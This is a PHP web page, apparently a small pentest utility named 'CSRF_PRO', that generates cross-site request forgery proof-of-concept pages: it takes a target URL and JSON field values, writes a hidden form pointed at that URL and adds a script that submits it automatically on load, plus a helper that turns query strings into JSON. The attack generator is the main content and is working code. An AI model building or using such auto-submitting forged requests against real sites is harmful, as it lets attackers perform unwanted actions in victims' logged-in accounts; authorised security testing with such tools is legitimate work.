<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CSRF_PRO</title>
<style>
    body {
        font-family: Arial, sans-serif;
        margin: 0;
        padding: 0;
        background-color: #f2f2f2;
    }

    .container {
        display: flex;
        justify-content: space-between;
        align-items: stretch;
        max-width: 1200px;
        margin: 20px auto;
        background-color: #fff;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        border-radius: 5px;
        overflow: hidden;
    }

    .left, .right {
        flex: 1;
        padding: 20px;
        box-sizing: border-box;
    }

    .left {
        background-color: #f0f0f0;
    }

    .right {
        background-color: #e0e0e0;
    }

    h1 {
        margin-top: 0;
        font-size: 24px;
        color: #333;
    }

    h2 {
        font-size: 20px;
        margin-top: 10px;
        color: #444;
    }

    label {
        font-size: 16px;
        color: #666;
    }

    input[type="text"],
    textarea {
        width: calc(100% - 16px);
        padding: 8px;
        margin: 6px 0;
        border: 1px solid #ccc;
        border-radius: 4px;
        box-sizing: border-box;
        font-size: 16px;
    }

    button {
        background-color: #4CAF50;
        color: white;
        padding: 10px 20px;
        border: none;
        border-radius: 4px;
        cursor: pointer;
        font-size: 16px;
    }

    button:hover {
        background-color: #45a049;
    }

    .result {
        white-space: pre-wrap;
        font-family: Consolas, monospace;
        font-size: 14px;
    }
</style>
</head>
<body>

<div class="container">
    <div class="left">
                <h1>CSRF PoC Generator</h1>

        <?php
        if ($_SERVER["REQUEST_METHOD"] == "POST") {
            $action_url = isset($_POST['action_url']) ? $_POST['action_url'] : '';
            $fields_json = isset($_POST['fields']) ? $_POST['fields'] : '';

            $fields = json_decode($fields_json, true);

            if ($fields === null) {
                echo "<p>Error: Invalid JSON format.</p>";
            } else {
                echo "<h2>CSRF PoC:</h2>\n";
                echo "<form id='csrf_form' action='" . htmlspecialchars($action_url) . "' method='POST'>\n";
                foreach ($fields as $name => $value) {
                    echo "<input type='hidden' name='" . htmlspecialchars($name) . "' value='" . htmlspecialchars($value) . "'>\n";
                }
                echo "</form>\n";
                echo "<script>document.getElementById('csrf_form').submit();</script>";
            }
        }
        ?>

        <form method="post">
            <label for="action_url">Web URL:</label><br>
            <input type="text" id="action_url" name="action_url" required><br>

            <label for="fields">JSON  
            </label><br>
<textarea id="fields" name="fields" rows="5" cols="50" required="" style="width: 565px; height: 567px;"></textarea>

            <button type="submit" style="margin-bottom:10px;">Exploit</button>

</style>        </form>

    </div>
    <div class="right" >
        <h1>Convert HTTP Query String to JSON</h1>


        <form method="post">
            <label for="query_string">Enter HTTP Query String:</label><br>
            <input type="text" id="query_string" name="query_string" required ><br>

            <button type="submit">Convert to JSON</button>
        </form>

        <div class="result">
            <?php
            if ($_SERVER["REQUEST_METHOD"] == "POST") {
                $query_string = isset($_POST['query_string']) ? $_POST['query_string'] : '';
                parse_str($query_string, $query_array);

                $json_data = json_encode($query_array, JSON_PRETTY_PRINT);

                if (json_last_error() !== JSON_ERROR_NONE) {
                    echo "<p>Error: " . json_last_error_msg() . "</p>";
                } else {
                    echo "<h2>JSON Representation:</h2>\n";
                    echo "<pre>" . htmlspecialchars($json_data) . "</pre>";
                }
            }
            ?>
        </div>
    </div>
</div>

</body>
</html>
<!DOCTYPE html>
<html>
<body>
<footer>
  <p>
<a href="https://www.facebook.com/im4xx">Ahmed Najeh></a><br>
<a href="mailto:im4xiq@gmail.com">im4xiq@gmail.com</a></p>
</footer>
</body>
</html>
